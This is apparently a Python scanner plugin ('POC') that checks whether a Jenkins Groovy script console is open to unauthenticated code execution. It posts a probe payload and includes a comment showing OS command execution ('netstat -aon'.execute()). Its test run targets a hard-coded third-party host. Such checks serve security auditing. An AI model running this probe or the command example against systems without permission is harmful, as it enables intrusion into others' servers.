#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  jenkins_script_console_java_execution 
Author    :  fenyouxiangyu
mail      :  fenyouxiangyu@sina.cn
Referer   : http://www.th3r3p0.com/vulns/jenkins/jenkinsVuln.html
"""

# Description : This module uses the Jenkins Groovy script console to execute OS commands using Java.
# Command     : println "netstat -aon".execute().text

import urlparse
def assign(service, arg):
    if service == 'jenkins':
        return True, arg

def audit(arg):
    add_url = 'script/'
    url = arg + add_url
    payload ='script=println%28Jenkins%29&json=%7B%22script%22%3A+%22println%28Jenkins%29%22%2C+%22%22%3A+%22%22%7D'
    code, head, res, errcode, _= curl.curl2(url,payload)
    if code == 200 and  'class jenkins.model.Jenkins' in res:
        security_hole(url)
        
if __name__ == '__main__':
    from dummy import *
    audit(assign('jenkins', 'http://sinv-56038.edu.hsr.ch/jenkins/')[1])